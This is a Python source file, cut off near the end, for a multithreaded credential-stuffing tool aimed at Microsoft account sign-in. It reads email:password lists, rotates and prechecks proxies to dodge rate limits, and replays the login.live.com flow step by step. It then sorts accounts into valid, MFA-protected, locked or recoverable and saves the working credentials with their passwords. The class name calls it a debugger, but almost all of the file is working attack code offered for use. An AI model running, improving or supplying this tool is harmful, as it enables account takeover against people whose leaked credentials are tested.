import requests
import json
import re
import uuid
import time
import sys
import os
import random
import signal
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from html.parser import HTMLParser
from urllib.parse import urlparse, parse_qs, quote


# ============================================================
# KILL SWITCH
# ============================================================

STOP_EVENT = threading.Event()


def _install_signal_handler():
    """Ctrl+C once = graceful stop; twice = force quit."""
    def handler(signum, frame):
        if STOP_EVENT.is_set():
            print("\n[!] Forcing exit...")
            os._exit(1)
        print("\n[!] Ctrl+C received. "
              "Finishing running tasks, then stopping. "
              "Press Ctrl+C again to force quit.")
        STOP_EVENT.set()
    try:
        signal.signal(signal.SIGINT, handler)
    except ValueError:
        # Not in main thread; skip
        pass


# ============================================================
# PROXY PARSING
# ============================================================

def _is_port(s):
    try:
        p = int(s)
        return 1 <= p <= 65535
    except (ValueError, TypeError):
        return False


def _is_ipv4(s):
    return bool(re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', s or ''))


def _is_likely_host(s):
    if not s:
        return False
    if _is_ipv4(s):
        return True
    return '.' in s and not s.startswith('.')


def parse_proxy_line(raw):
    if not raw:
        return None
    line = raw.strip()
    if not line or line.startswith("#"):
        return None

    scheme = None
    for s in ("socks5h", "socks5", "socks4a", "socks4", "https", "http"):
        prefix = s + "://"
        if line.lower().startswith(prefix):
            scheme = s
            line = line[len(prefix):]
            break

    m = re.match(r'^\[([^\]]+)\]:(\d+)$', line)
    if m:
        return {"scheme": scheme or "http", "host": m.group(1),
                "port": m.group(2), "username": None, "password": None}

    if "@" in line:
        at_parts = line.split("@")
        if len(at_parts) == 2:
            a, b = at_parts
            if ":" in a and ":" in b:
                b_last = b.rsplit(":", 1)[-1]
                a_last = a.rsplit(":", 1)[-1]
                if _is_port(b_last) and not _is_port(a_last.split(".")[0]):
                    host, port = b.rsplit(":", 1)
                    user, pw = a.split(":", 1)
                    return {"scheme": scheme or "http", "host": host,
                            "port": port, "username": user, "password": pw}
                if _is_port(a_last):
                    host, port = a.rsplit(":", 1)
                    user, pw = b.split(":", 1)
                    return {"scheme": scheme or "http", "host": host,
                            "port": port, "username": user, "password": pw}
            if ":" not in a and ":" in b:
                host, port = b.rsplit(":", 1)
                if _is_port(port):
                    return {"scheme": scheme or "http", "host": host,
                            "port": port, "username": a, "password": None}
            if ":" in a and ":" not in b:
                host, port = a.rsplit(":", 1)
                if _is_port(port):
                    return {"scheme": scheme or "http", "host": host,
                            "port": port, "username": b, "password": None}
            if ":" not in a and ":" not in b and _is_port(b):
                return {"scheme": scheme or "http", "host": a,
                        "port": b, "username": None, "password": None}
        elif len(at_parts) == 3:
            user, pw, hostport = at_parts
            if ":" in hostport:
                host, port = hostport.rsplit(":", 1)
                if _is_port(port):
                    return {"scheme": scheme or "http", "host": host,
                            "port": port, "username": user, "password": pw}

    for delim in (":", ",", ";"):
        if delim not in line:
            continue
        parts = line.split(delim)
        if len(parts) == 4:
            if _is_port(parts[1]) and not _is_port(parts[0]):
                return {"scheme": scheme or "http", "host": parts[0],
                        "port": parts[1], "username": parts[2], "password": parts[3]}
            if _is_port(parts[3]) and not _is_port(parts[2]):
                if _is_likely_host(parts[0]):
                    return {"scheme": scheme or "http", "host": parts[0],
                            "port": parts[3], "username": parts[1], "password": parts[2]}
                return {"scheme": scheme or "http", "host": parts[2],
                        "port": parts[3], "username": parts[0], "password": parts[1]}
        elif len(parts) == 3:
            if _is_port(parts[1]) and not _is_port(parts[0]):
                return {"scheme": scheme or "http", "host": parts[0],
                        "port": parts[1], "username": parts[2], "password": None}
            if _is_port(parts[2]):
                if _is_likely_host(parts[0]) and not _is_likely_host(parts[1]):
                    return {"scheme": scheme or "http", "host": parts[0],
                            "port": parts[2], "username": parts[1], "password": None}
                if _is_likely_host(parts[1]) and not _is_likely_host(parts[0]):
                    return {"scheme": scheme or "http", "host": parts[1],
                            "port": parts[2], "username": parts[0], "password": None}
                return {"scheme": scheme or "http", "host": parts[0],
                        "port": parts[2], "username": parts[1], "password": None}
        elif len(parts) == 2:
            if _is_port(parts[1]):
                return {"scheme": scheme or "http", "host": parts[0],
                        "port": parts[1], "username": None, "password": None}
    return None


def load_proxies(path):
    if not path:
        return []
    if not os.path.exists(path):
        print(f"[WARN] Proxy file '{path}' not found. Running direct.")
        return []
    proxies = []
    with open(path, encoding="utf-8") as f:
        for i, line in enumerate(f, 1):
            p = parse_proxy_line(line)
            if p:
                proxies.append(p)
            elif line.strip():
                print(f"[WARN] Skipped unparseable proxy line {i}: {line.strip()}")
    print(f"[INFO] Parsed {len(proxies)} proxies from {path}")
    return proxies


def proxy_to_requests_dict(p):
    if not p:
        return None
    scheme = p.get("scheme") or "http"
    user = p.get("username")
    pw = p.get("password")
    auth = ""
    if user:
        auth = quote(str(user), safe="")
        if pw:
            auth += ":" + quote(str(pw), safe="")
        auth += "@"
    url = f"{scheme}://{auth}{p['host']}:{p['port']}"
    return {"http": url, "https": url}


def check_proxy(proxy, test_url="https://login.live.com/", timeout=10):
    """Returns True if the proxy can reach the target."""
    try:
        r = requests.get(
            test_url,
            proxies=proxy_to_requests_dict(proxy),
            timeout=timeout,
            allow_redirects=False,
            headers={"User-Agent": "Mozilla/5.0"},
        )
        # Any real HTTP response means the proxy tunnel works.
        return r.status_code < 500
    except Exception:
        return False


def filter_proxies(proxies, workers=50, timeout=10, verbose=True):
    """Test all proxies in parallel, return only the working ones."""
    if not proxies:
        return []
    good = []
    print_lock = threading.Lock()
    checked = [0]

    def check_one(p):
        if STOP_EVENT.is_set():
            return None
        ok = check_proxy(p, timeout=timeout)
        with print_lock:
            checked[0] += 1
            n = checked[0]
            total = len(proxies)
            label = f"{p.get('scheme','http')}://{p['host']}:{p['port']}"
            if ok:
                print(f"\r  [proxy check] {n}/{total}  OK   {label}          ")
            elif verbose:
                print(f"\r  [proxy check] {n}/{total}  DEAD {label}          ")
        return ok

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(check_one, p): p for p in proxies}
        for fut in as_completed(futures):
            p = futures[fut]
            try:
                if fut.result():
                    good.append(p)
            except Exception:
                pass

    print()  # newline after progress line
    return good


class ProxyPool:
    def __init__(self, proxies, mode="round_robin"):
        self.proxies = proxies or []
        self.mode = mode
        self.lock = threading.Lock()
        self.index = 0

    def get(self):
        if not self.proxies:
            return None
        with self.lock:
            if self.mode == "random":
                return random.choice(self.proxies)
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return p


# ============================================================
# LOGIN FLOW
# ============================================================

class FormExtractor(HTMLParser):
    def __init__(self):
        super().__init__()
        self.inputs = {}

    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            d = dict(attrs)
            name = d.get('name')
            if name is not None:
                self.inputs[name] = d.get('value', '')


class MicrosoftLoginDebugger:
    def __init__(self, username, password, base_url="https://login.live.com",
                 verbose=False, proxy=None):
        self.username = username
        self.password = password
        self.base_url = base_url
        self.verbose = verbose
        self.proxy = proxy
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                      "image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": base_url,
            "Referer": f"{base_url}/ppsecure/post.srf",
            "DNT": "1"
        })
        pd = proxy_to_requests_dict(proxy)
        if pd:
            self.session.proxies.update(pd)

        self.uaid = None
        self.server_data = {}
        self.hidden_inputs = {}
        self.ppft = None
        self.url_post = None
        self.url_gct = None
        self.vanguard_flow_token = None
        self.credential_type_data = None
        self.check_password_result = None
        self.final_submission_result = None
        self.privacy_notice_url = None
        self.is_recover_mode = False

    def _log(self, msg):
        if self.verbose:
            print(msg)

    def _get_uaid(self):
        return str(uuid.uuid4()).replace('-', '')

    def _extract_json_string(self, html, key):
        pattern = r'"' + re.escape(key) + r'"\s*:\s*"((?:[^"\\]|\\.)*)"'
        m = re.search(pattern, html)
        if not m:
            return None
        raw = m.group(1)
        try:
            return json.loads('"' + raw + '"')
        except Exception:
            return raw.replace('\\"', '"').replace('\\\\', '\\')

    def _extract_json_bool(self, html, key):
        pattern = r'"' + re.escape(key) + r'"\s*:\s*(true|false)'
        m = re.search(pattern, html)
        return (m.group(1) == 'true') if m else None

    def _extract_inputs(self, html_text):
        p = FormExtractor()
        p.feed(html_text)
        self.hidden_inputs = p.inputs

    def _find_ppft_in(self, html):
        for key in ("PPFT", "i0327"):
            if key in self.hidden_inputs and self.hidden_inputs[key]:
                return self.hidden_inputs[key]
        sft_tag = self._extract_json_string(html, "sFTTag")
        if sft_tag:
            m = re.search(r'value="([^"]+)"', sft_tag)
            if m:
                return m.group(1)
        val = self._extract_json_string(html, "sPOST_PaginatedLoginState")
        if val and len(val) > 20:
            return val
        m = re.search(r'(-D[A-Za-z0-9\*!\.\$\-_/]{20,})', html)
        return m.group(1) if m else None

    @staticmethod
    def _pref_name(pref):
        return {1: "Password", 2: "AuthenticatorPush",
                4: "Certificate", 7: "Passkey/FIDO",
                1000: "Password"}.get(pref, f"Unknown({pref})")

    # ---------------- Steps ----------------
    def bootstrap_login(self):
        self.uaid = self._get_uaid()
        initial_url = f"{self.base_url}/ppsecure/post.srf"
        params = {"wa": "w1", "rpsrvce": "ess", "type": "11",
                  "pc": "1", "uaid": self.uaid}
        try:
            resp = self.session.get(initial_url, params=params,
                                    allow_redirects=True, timeout=30)
            if self.verbose:
                safe = self.username.replace("@", "_").replace(".", "_")
                with open(f"debug_{safe}_initial.html", "w", encoding="utf-8") as f:
                    f.write(resp.text)
            self.server_data = {
                "urlPost": self._extract_json_string(resp.text, "urlPost"),
                "urlGetCredentialType": self._extract_json_string(resp.text, "urlGetCredentialType"),
                "sFTTag": self._extract_json_string(resp.text, "sFTTag"),
            }
            self._extract_inputs(resp.text)
            self.ppft = self._find_ppft_in(resp.text)
            self.url_post = self.server_data.get("urlPost") or resp.url
            self.url_gct = self.server_data.get("urlGetCredentialType")
            if not self.url_gct:
                q = parse_qs(urlparse(resp.url).query)
                opid = q.get("opid", [""])[0]
                self.url_gct = (f"{self.base_url}/GetCredentialType.srf"
                                f"?opid={opid}&id=38936&mkt=EN-US&lc=1033"
                                f"&uaid={self.uaid}")
            return bool(self.ppft)
        except Exception as e:
            self._log(f"Bootstrap Exception: {e}")
            return False

    def hydrate_session(self):
        if not self.ppft:
            return False
        payload = {
            "PPFT": self.ppft, "PPSX": "", "login": "", "loginfmt": "",
            "passwd": "", "CookieDisclosure": "1", "LoginOptions": "3",
            "IsFidoSupported": "true", "isRecoveryAttemptPost": "false",
            "type": "11", "uaid": self.uaid
        }
        h = self.session.headers.copy()
        h.update({"Content-Type": "application/x-www-form-urlencoded",
                  "X-Requested-With": "XMLHttpRequest"})
        try:
            resp = self.session.post(self.url_post, data=payload,
                                     headers=h, allow_redirects=False, timeout=30)
            if self.verbose:
                safe = self.username.replace("@", "_").replace(".", "_")
                with open(f"debug_{safe}_hydration.html", "w", encoding="utf-8") as f:
                    f.write(resp.text)
            self._extract_inputs(resp.text)
            new_ppft = self._find_ppft_in(resp.text)
            if new_ppft:
                self.ppft = new_ppft
                if "PPFT" in self.hidden_inputs:
                    self.hidden_inputs["PPFT"] = new_ppft
                if "i0327" in self.hidden_inputs:
                    self.hidden_inputs["i0327"] = new_ppft
            return True
        except Exception as e:
            self._log(f"Hydration Exception: {e}")
            return False

    def get_credential_type(self):
        if not self.ppft or not self.url_gct:
            return None
        payload = {
            "checkPhones": False, "country": "", "federationFlags": 3,
            "flowToken": self.ppft, "forceotclogin": False,
            "isCookieBannerShown": False, "isExternalFederationDisallowed": False,
            "isFederationDisabled": False, "isFidoSupported": True,
            "isOtherIdpSupported": False, "isReactLoginRequest": True,
            "isRemoteConnectSupported": False, "isRemoteNGCSupported": True,
            "isSignup": False, "originalRequest": "", "otclogindisallowed": False,
            "uaid": self.uaid, "username": self.username
        }
        h = self.session.headers.copy()
        h.update({"Content-Type": "application/json; charset=utf-8",
                  "X-Requested-With": "XMLHttpRequest"})
        try:
            resp = self.session.post(self.url_gct, json=payload, headers=h, timeout=30)
            if resp.status_code == 200:
                self.credential_type_data = resp.json()
                if "FlowToken" in self.credential_type_data:
                    self.ppft = self.credential_type_data["FlowToken"]
                    if "PPFT" in self.hidden_inputs:
                        self.hidden_inputs["PPFT"] = self.ppft
                    if "i0327" in self.hidden_inputs:
                        self.hidden_inputs["i0327"] = self.ppft
                return self.credential_type_data
            return None
        except Exception as e:
            self._log(f"GCT Exception: {e}")
            return None

    def check_password(self):
        if not self.ppft:
            return None
        url = f"{self.base_url}/checkpassword.srf"
        payload = {"username": self.username, "password": self.password,
                   "checkpasswordflowtoken": self.ppft}
        h = self.session.headers.copy()
        h.update({"Content-Type": "application/json; charset=utf-8",
                  "X-Requested-With": "XMLHttpRequest"})
        try:
            resp = self.session.post(url, json=payload, headers=h, timeout=30)
            if resp.status_code == 200:
                self.check_password_result = resp.json()
                if "vanguardflowtoken" in self.check_password_result:
                    self.vanguard_flow_token = self.check_password_result["vanguardflowtoken"]
                return self.check_password_result
            return None
        except Exception as e:
            self._log(f"CheckPassword Exception: {e}")
            return None

    def final_submission(self):
        if not self.vanguard_flow_token:
            return None
        form_data = self.hidden_inputs.copy()
        form_data.update({
            "PPFT": self.ppft, "i0327": self.ppft, "PPSX": "",
            "login": self.username, "loginfmt": self.username,
            "passwd": self.password, "vanguardflowtoken": self.vanguard_flow_token,
            "CookieDisclosure": "1", "LoginOptions": "3",
            "IsFidoSupported": "true", "isRecoveryAttemptPost": "false",
            "type": "11", "uaid": self.uaid
        })
        h = self.session.headers.copy()
        h.update({"Content-Type": "application/x-www-form-urlencoded",
                  "X-Requested-With": "XMLHttpRequest"})
        try:
            resp = self.session.post(self.url_post, data=form_data,
                                     headers=h, allow_redirects=False, timeout=30)
            if self.verbose:
                safe = self.username.replace("@", "_").replace(".", "_")
                with open(f"debug_{safe}_final.html", "w", encoding="utf-8") as f:
                    f.write(resp.text)
            self.final_submission_result = {
                "status_code": resp.status_code,
                "location": resp.headers.get("Location"),
                "html": resp.text
            }
            if "privacynotice" in resp.text or "notice" in (resp.headers.get("Location") or ""):
                m = re.search(r'name="code"\s+value="([^"]+)"', resp.text)
                if m:
                    self.privacy_notice_url = m.group(1)
            return self.final_submission_result
        except Exception as e:
            self._log(f"Final Submission Exception: {e}")
            return None

    def analyze_status(self):
        status = {
            "account_exists": False, "password_correct": False,
            "mfa_required": False, "mfa_types": [],
            "error_message": None, "error_code": None,
            "final_status": "UNKNOWN", "redirect_url": None,
            "privacy_notice_code": None, "is_recover_mode": False,
            "pref_credential": None, "has_password": None,
            "password_disabled": False,
        }

        if self.credential_type_data:
            if_exists = self.credential_type_data.get("IfExistsResult")
            if if_exists == 1:
                status["final_status"] = "ACCOUNT_NOT_FOUND"
                return status
            status["account_exists"] = True
            if if_exists in (5, 6):
                status["error_message"] = f"IfExistsResult={if_exists}: federated"
            elif if_exists == 8:
                status["error_message"] = "IfExistsResult=8: passkey-preferred"
            elif if_exists != 0:
                status["error_message"] = f"IfExistsResult={if_exists} (unexpected)"

            creds = self.credential_type_data.get("Credentials", {}) or {}
            has_password = creds.get("HasPassword")
            is_pwd_disabled = creds.get("IsPasswordDisabled")
            pref = creds.get("PrefCredential")
            status["pref_credential"] = pref
            status["has_password"] = bool(has_password)
            status["password_disabled"] = bool(is_pwd_disabled)
            if creds.get("HasFido"):
                status["mfa_types"].append("FIDO")
            if creds.get("HasRemoteNGC"):
                status["mfa_types"].append("AUTHENTICATOR")
            if creds.get("HasPhone"):
                status["mfa_types"].append("SMS")
            if is_pwd_disabled or (has_password is not None and not has_password):
                status["final_status"] = "PASSWORDLESS_ONLY"
                status["error_message"] = (
                    f"Password login disabled; preferred: {self._pref_name(pref)}"
                )
                return status

        if self.final_submission_result:
            code = self.final_submission_result["status_code"]
            html = self.final_submission_result["html"]
            loc = self.final_submission_result["location"]

            if code in (301, 302, 303, 307, 308):
                status["redirect_url"] = loc
                low = (loc or "").lower()
                patterns = [
                    ("/abuse", "ACCOUNT_LOCKED"), ("/recover", "RECOVER_MODE"),
                    ("recover", "RECOVER_MODE"), ("resetpassword", "PASSWORD_RESET_REQUIRED"),
                    ("/fido", "FIDO_CHALLENGE"), ("fido", "FIDO_CHALLENGE"),
                    ("authenticator", "AUTHENTICATOR_CHALLENGE"),
                    ("ngc", "AUTHENTICATOR_CHALLENGE"),
                    ("privacynotice", "PRIVACY_NOTICE"), ("hip", "HIP_CHALLENGE"),
                    ("verify", "VERIFY_REQUIRED"), ("addsecurityinfo", "SECURITY_INFO_REQUIRED"),
                    ("error", "ERROR_REDIRECT"),
                ]
                for pattern, fstatus in patterns:
                    if pattern in low:
                        status["final_status"] = fstatus
                        status["error_message"] = f"{fstatus}: {loc}"
                        if fstatus in ("FIDO_CHALLENGE", "AUTHENTICATOR_CHALLENGE",
                                       "HIP_CHALLENGE", "VERIFY_REQUIRED"):
                            status["mfa_required"] = True
                        if fstatus in ("RECOVER_MODE", "ACCOUNT_LOCKED",
                                       "PASSWORD_RESET_REQUIRED", "SECURITY_INFO_REQUIRED"):
                            status["password_correct"] = False
                        if fstatus == "RECOVER_MODE":
                            status["is_recover_mode"] = True
                        return status
                status["final_status"] = "REDIRECTED"
                status["password_correct"] = True
                return status

            if code == 200:
                action_match = re.search(
                    r'<form[^>]*\baction=["\']([^"\']+)["\']', html, re.IGNORECASE)
                if action_match:
                    action = action_match.group(1)
                    low_action = action.lower()
                    for pattern, fstatus in [
                        ("/recover", "RECOVER_MODE"), ("/abuse", "ACCOUNT_LOCKED"),
                        ("resetpassword", "PASSWORD_RESET_REQUIRED"),
                        ("verify", "VERIFY_REQUIRED"), ("hip", "HIP_CHALLENGE"),
                        ("bridge/fido", "FIDO_CHALLENGE"),
                    ]:
                        if pattern in low_action:
                            status["final_status"] = fstatus
                            status["redirect_url"] = action
                            status["error_message"] = f"{fstatus}: {action}"
                            if fstatus in ("HIP_CHALLENGE", "FIDO_CHALLENGE"):
                                status["mfa_required"] = True
                            else:
                                status["password_correct"] = False
                            if fstatus == "RECOVER_MODE":
                                status["is_recover_mode"] = True
                            return status
                if "/abuse" in html.lower():
                    status["final_status"] = "ACCOUNT_LOCKED"
                    status["error_message"] = "Abuse page in HTML"
                    return status
                if self.privacy_notice_url:
                    status["privacy_notice_code"] = self.privacy_notice_url
                    status["final_status"] = "PRIVACY_NOTICE"
                    status["password_correct"] = True
                    return status
                has_error = self._extract_json_bool(html, "fHasError")
                error_code = self._extract_json_string(html, "sErrorCode")
                error_txt = self._extract_json_string(html, "sErrTxt")
                status["error_code"] = error_code
                status["error_message"] = error_txt
                if has_error:
                    status["password_correct"] = False
                    ec = str(error_code)
                    et = (error_txt or "").lower()
                    if "80041012" in ec or "incorrect" in et:
                        status["final_status"] = "WRONG_CREDENTIALS"
                    elif "80041011" in ec or "lock" in et:
                        status["final_status"] = "ACCOUNT_LOCKED"
                    elif "80041032" in ec:
                        status["final_status"] = "VALIDATION_ERROR"
                    else:
                        status["final_status"] = "LOGIN_FAILED"
                else:
                    status["password_correct"] = True
                    status["final_status"] = "SUCCESS_OR_INTERMEDIATE"
                return status

        if self.check_password_result:
            vr = (self.check_password_result.get("validationresult") or "").lower()
            detail = (self.check_password_result.get("validationdetail") or "").lower()
            if detail == "toomanyattempts":
                status["final_status"] = "RATE_LIMITED"
                status["error_message"] = "checkpassword: toomanyattempts"
            elif detail == "badpassword":
                status["final_status"] = "WRONG_CREDENTIALS"
                status["error_message"] = "checkpassword: badpassword"
            elif detail == "blocked":
                status["final_status"] = "ACCOUNT_LOCKED"
                status["error_message"] = "checkpassword: blocked"
            elif vr == "succeed":
                status["final_status"] = "PRE_FLIGHT_PASSED"
            else:
                status["final_status"] = "PRE_FLIGHT_FAILED"
                status["error_message"] = f"checkpassword: {vr} / {detail}"
        else:
            status["final_status"] = "FLOW_INCOMPLETE"
        return status

    def run_simulation(self):
        if STOP_EVENT.is_set():
            return {"final_status": "STOPPED", "account_exists": None,
                    "password_correct": False}
        if not self.bootstrap_login():
            return {"final_status": "BOOTSTRAP_FAILED",
                    "account_exists": False, "password_correct": False}
        if STOP_EVENT.is_set():
            return {"final_status": "STOPPED", "account_exists": None,
                    "password_correct": False}
        self.hydrate_session()
        if STOP_EVENT.is_set():
            return {"final_status": "STOPPED", "account_exists": None,
                    "password_correct": False}
        self.get_credential_type()
        self.check_password()
        if STOP_EVENT.is_set():
            return {"final_status": "STOPPED", "account_exists": None,
                    "password_correct": False}
        if self.vanguard_flow_token:
            self.final_submission()
        return self.analyze_status()


# ============================================================
# MASS CHECKER
# ============================================================

class MassChecker:
    def __init__(self, input_file, output_file="results.txt", max_workers=10,
                 save_mode="all", verbose=False, proxies=None,
                 proxy_mode="round_robin", delay=0.0, precheck_proxies=True,
                 proxy_check_timeout=10):
        self.input_file = input_file
        self.output_file = output_file
        self.max_workers = max_workers
        self.verbose = verbose
        self.save_mode = save_mode
        self.delay = delay
        self.precheck_proxies = precheck_proxies
        self.proxy_check_timeout = proxy_check_timeout
        self.proxy_pool = ProxyPool(proxies or [], mode=proxy_mode)
        self.results = []
        self.completed_count = 0
        self.total_count = 0
        self.lock = threading.Lock()
        self.file_lock = threading.Lock()

    def parse_line(self, line):
        line = line.strip()
        if not line or line.startswith("#"):
            return None
        if ":" in line:
            parts = line.split(":", 1)
        elif "|" in line:
            parts = line.split("|", 1)
        else:
            return None
        if len(parts) != 2:
            return None
        email, password = parts[0].strip(), parts[1].strip()
        if "@" not in email:
            return None
        return email, password

    def load_accounts(self):
        if not os.path.exists(self.input_file):
            print(f"[ERROR] File '{self.input_file}' not found.")
            return []
        accounts = []
        with open(self.input_file, 'r', encoding='utf-8') as f:
            for i, line in enumerate(f, 1):
                parsed = self.parse_line(line)
                if parsed:
                    accounts.append(parsed)
                elif line.strip():
                    print(f"[WARN] Skipping malformed line {i}: {line.strip()}")
        print(f"[INFO] Loaded {len(accounts)} credentials from {self.input_file}")
        return accounts

    def _should_save(self, status):
        if self.save_mode == "all":
            return True
        final_status = status.get("final_status", "")
        is_correct = status.get("password_correct", False)
        is_mfa = status.get("mfa_required", False)
        is_recover = status.get("is_recover_mode", False)
        is_valid_creds = (is_correct or is_mfa) and final_status not in (
            "ACCOUNT_LOCKED", "WRONG_CREDENTIALS")
        is_undecided = final_status in (
            "PRE_FLIGHT_PASSED", "SUCCESS_OR_INTERMEDIATE", "FLOW_INCOMPLETE",
            "BOOTSTRAP_FAILED", "PASSWORDLESS_ONLY", "FEDERATED_ACCOUNT",
            "RATE_LIMITED",
        ) and not is_valid_creds
        if self.save_mode == "working":
            return is_valid_creds
        elif self.save_mode == "working_undecided":
            return is_valid_creds or is_undecided
        elif self.save_mode == "working_undecided_recover":
            return (is_valid_creds or is_undecided or is_recover
                    or final_status in ("PASSWORDLESS_ONLY", "FEDERATED_ACCOUNT"))
        return True

    def _process_account(self, email, password, index):
        if STOP_EVENT.is_set():
            return None
        if self.delay > 0:
            time.sleep(self.delay)
        if STOP_EVENT.is_set():
            return None

        proxy = self.proxy_pool.get()
        proxy_str = f"{proxy['host']}:{proxy['port']}" if proxy else "direct"
        status = None

        for attempt in range(2 if proxy else 1):
            try:
                debugger = MicrosoftLoginDebugger(email, password,
                                                  verbose=self.verbose, proxy=proxy)
                status = debugger.run_simulation()
                break
            except (requests.exceptions.ProxyError,
                    requests.exceptions.ConnectTimeout,
                    requests.exceptions.ReadTimeout) as e:
                if attempt == 0 and proxy:
                    proxy = self.proxy_pool.get()
                    proxy_str = f"{proxy['host']}:{proxy['port']}" if proxy else "direct"
                    continue
                status = {"final_status": "PROXY_ERROR", "account_exists": None,
                          "password_correct": False, "mfa_required": False,
                          "mfa_types": [], "error_message": str(e),
                          "error_code": "PROXY", "is_recover_mode": False}
            except Exception as e:
                status = {"final_status": "EXCEPTION", "account_exists": False,
                          "password_correct": False, "mfa_required": False,
                          "mfa_types": [], "error_message": str(e),
                          "error_code": "EXC", "is_recover_mode": False}
                break

        if status is None:
            status = {"final_status": "UNKNOWN", "account_exists": False,
                      "password_correct": False, "mfa_required": False,
                      "mfa_types": [], "error_message": None, "error_code": None,
                      "is_recover_mode": False}

        # Don't save stopped runs
        if status.get("final_status") == "STOPPED":
            return status

        mfa_str = ", ".join(status.get("mfa_types", [])) if status.get("mfa_types") else "None"
        err_code = status.get("error_code", "") or ""
        err_msg = status.get("error_message", "") or ""

        file_line = (f"[{index}/{self.total_count}] {email} | {password} | "
                     f"{status['final_status']} | MFA: {mfa_str} | "
                     f"Code: {err_code} | Proxy: {proxy_str} | Msg: {err_msg}\n")

        status_str = status['final_status']
        reset = "\033[0m"
        if status.get('password_correct') or status.get('mfa_required'):
            color = "\033[92m"
        elif status.get('is_recover_mode') or status_str in (
                "RECOVER_MODE", "PASSWORDLESS_ONLY", "FEDERATED_ACCOUNT",
                "RATE_LIMITED"):
            color = "\033[93m"
        elif status_str in ("ACCOUNT_LOCKED", "WRONG_CREDENTIALS",
                            "ACCOUNT_NOT_FOUND", "PROXY_ERROR"):
            color = "\033[91m"
        else:
            color = "\033[94m"

        console_line = (f"{color}[{index}/{self.total_count}] {email} | "
                        f"{status_str} | MFA: {mfa_str}{reset}")
        if err_msg:
            console_line += f" ({err_msg})"

        with self.lock:
            self.completed_count += 1
            current = self.completed_count
            total = self.total_count
            pct = (current / total) * 100
            if self._should_save(status):
                with self.file_lock:
                    with open(self.output_file, 'a', encoding='utf-8') as f:
                        f.write(file_line)
            print(f"\r[{current}/{total}] ({pct:.1f}%) {console_line}", end="\n")
            self.results.append(status)
        return status

    def run(self):
        accounts = self.load_accounts()
        if not accounts:
            print("[ERROR] No valid accounts found.")
            return
        self.total_count = len(accounts)
        self.completed_count = 0

        # ---- Proxy precheck ----
        if self.proxy_pool.proxies and self.precheck_proxies:
            n = len(self.proxy_pool.proxies)
            print(f"\n[INFO] Prechecking {n} proxies "
                  f"(workers=50, timeout={self.proxy_check_timeout}s)...")
            print("[INFO] This can take a while for large lists. "
                  "Ctrl+C to stop.")
            good = filter_proxies(
                self.proxy_pool.proxies,
                workers=50,
                timeout=self.proxy_check_timeout,
                verbose=True,
            )
            print(f"[INFO] {len(good)}/{n} proxies alive")
            if not good:
                print("[WARN] No proxies survived precheck. Running direct.")
            self.proxy_pool.proxies = good

            if STOP_EVENT.is_set():
                print("[INFO] Stopped before starting.")
                return

        with open(self.output_file, 'w', encoding='utf-8'):
            pass

        print(f"\n[INFO] Starting mass check for {self.total_count} accounts "
              f"with {self.max_workers} threads...")
        if self.proxy_pool.proxies:
            print(f"[INFO] Proxies: {len(self.proxy_pool.proxies)} "
                  f"(mode: {self.proxy_pool.mode})")
        print(f"[INFO] Output: {self.output_file} (Mode: {self.save_mode})")
        print("[INFO] Press Ctrl+C once to stop gracefully "
              "(twice to force-quit).\n")

        start_time = time.time()
        executor = ThreadPoolExecutor(max_workers=self.max_workers)
        futures = {
            executor.submit(self._process_account, email, password, i + 1): (email, password)
            for i, (email, password) in enumerate(accounts)
        }

        pending = set(futures.keys())
        try:
            while pending:
                if STOP_EVENT.is_set():
                    break
                done, pending = wait(pending, timeout=1.0,
                                     return_when=FIRST_COMPLETED)
                for fut in done:
                    email, _ = futures[fut]
                    try:
                        fut.result()
                    except Exception as exc:
                        print(f"\n[ERROR] {email}: {exc}")
        except KeyboardInterrupt:
            STOP_EVENT.set()
        finally:
            if STOP_EVENT.is_set():
                print("\n[INFO] Stopping - cancelling pending tasks...")
                for f in pending:
                    f.cancel()
                executor.shutdown(wait=False, cancel_futures=True)
            else:
                executor.shutdown(wait=True)

        elapsed = time.time() - start_time
        stopped = STOP_EVENT.is_set()
        print(f"\n[INFO] {'Stopped' if stopped else 'Finished'} in {elapsed:.2f}s")
        print(f"[INFO] Completed {self.completed_count}/{self.total_count} accounts")

        def cnt(s):
            return sum(1 for r in self.results if r.get('final_status') == s)
        print("\n--- SUMMARY ---")
        print(f"Valid (Password Correct): {sum(1 for s in self.results if s.get('password_correct'))}")
        print(f"MFA Required:             {sum(1 for s in self.results if s.get('mfa_required'))}")
        print(f"Account Not Found:        {cnt('ACCOUNT_NOT_FOUND')}")
        print(f"Wrong Credentials:        {cnt('WRONG_CREDENTIALS')}")
        print(f"Account Locked:           {cnt('ACCOUNT_LOCKED')}")
        print(f"Recover Mode:             {sum(1 for s in self.results if s.get('is_recover_mode'))}")
        print(f"Password Reset Required:  {cnt('PASSWORD_RESET_REQUIRED')}")
        print(f"Verify Required:          {cnt('VERIFY_REQUIRED')}")
        print(f"FIDO Challenge:           {cnt('FIDO_CHALLENGE')}")
        print(f"Auth Challenge:           {cnt('AUTHENTICATOR_CHALLENGE')}")
        print(f"Privacy Notice:           {cnt('PRIVACY_NOTICE')}")
        print(f"Passwordless Only:        {cnt('PASSWORDLESS_ONLY')}")
        print(f"Pre-Flight Passed:        {cnt('PRE_FLIGHT_PASSED')}")
        print(f"Pre-Flight Failed:        {cnt('PRE_FLIGHT_FAILED')}")
        print(f"Federated (other IdP):    {cnt('FEDERATED_ACCOUNT')}")
        print(f"Rate Limited:             {cnt('RATE_LIMITED')}")
        print(f"Bootstrap Failed:         {cnt('BOOTSTRAP_FAILED')}")
        print(f"Proxy Errors:             {cnt('PROXY_ERROR')}")
        print(f"Total Processed:          {len(self.results)}")
        if self.results:
            print(f"Average Time Per Account: {elapsed / len(self.results):.2f}s")


# ============================================================
# INTERACTIVE PROMPTS
# ============================================================

def ask(prompt, default=None, cast=str):
    suffix = f" [{default}]" if default is not None else ""
    while True:
